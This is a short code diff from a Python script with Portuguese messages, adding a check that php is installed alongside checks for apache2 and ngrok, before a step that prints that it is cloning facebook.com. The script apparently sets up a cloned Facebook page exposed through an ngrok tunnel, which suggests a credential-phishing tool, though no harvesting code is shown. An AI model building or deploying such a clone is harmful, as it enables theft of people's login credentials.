@@ -13,6 +13,9 @@ if os.popen('which apache2').read()=='':
 if os.popen('which ngrok').read()=='':
 	print('\033[1;31m[!] ngrok nao encontrado.')
 	exit()
+if os.popen('which php').read()=='':
+	print('\033[1;31m[!] php nao encontrado.')
+	exit()
 
 url = 'http://facebook.com'
 print "[*] clonando facebook.com..."
